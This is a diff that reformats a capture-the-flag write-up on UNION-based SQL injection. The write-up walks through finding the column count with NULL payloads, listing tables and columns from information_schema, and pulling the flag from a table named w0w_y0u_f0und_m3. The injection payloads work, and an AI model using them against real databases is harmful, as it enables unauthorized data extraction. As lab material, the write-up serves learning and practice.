@@ -9,23 +9,25 @@ pagination_prev: null
 ![1](https://github.com/Knign/Write-ups/assets/110326359/26c58880-6263-475a-af38-6d87ebf8ed62)
 
 ## Determining the number of columns required
-- Let's find out how many columns this table has using the `NULL` values.
+Let's find out how many columns this table has using the `NULL` values.
 ```
 UNION SELECT NULL
 UNION SELECT NULL,NULL
 UNION SELECT NULL,NULL,NULL
 ```
-- When the number of `NULL` values matches the number of columns, the database returns a proper output.
+When the number of `NULL` values matches the number of columns, the database returns a proper output.
 ```
 1 UNION SELECT NULL, NULL, NULL, NULL
 ```
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/84ecfac8-9f9d-4452-a4ad-f65264c4500e)
 
-- So the current table has four columns.
+So the current table has four columns.
+
 ## Finding all tables from the database
-- Now we want to find out the other tables so that we can figure out which one might be useful for us.
-- For that we can query `information_schema.tables` to list the tables in the database
+Now we want to find out the other tables so that we can figure out which one might be useful for us.
+
+For that we can query `information_schema.tables` to list the tables in the database
 ```
 1 UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables
 ```
@@ -36,7 +38,7 @@ UNION SELECT NULL,NULL,NULL
 Useful table: w0w_y0u_f0und_m3
 ```
 ## Finding all columns from w0w_y0u_f0und_m3
-- In order to find all the columns in the database we have to query `information_schema.columns`.
+In order to find all the columns in the database we have to query `information_schema.columns`.
 ```
 1 UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns
 ```
@@ -47,7 +49,7 @@ Useful table: w0w_y0u_f0und_m3
 Useful column: f0und_m3
 ```
 ## Finding the flag
-- For the final step, we simply have to modify our query a little bit and select from `w0w_y0u_f0und_m3`.
+For the final step, we simply have to modify our query a little bit and select from `w0w_y0u_f0und_m3`.
 ```
 1 UNION SELECT f0und_m3, NULL, NULL, NULL FROM w0w_y0u_f0und_m3
 ```
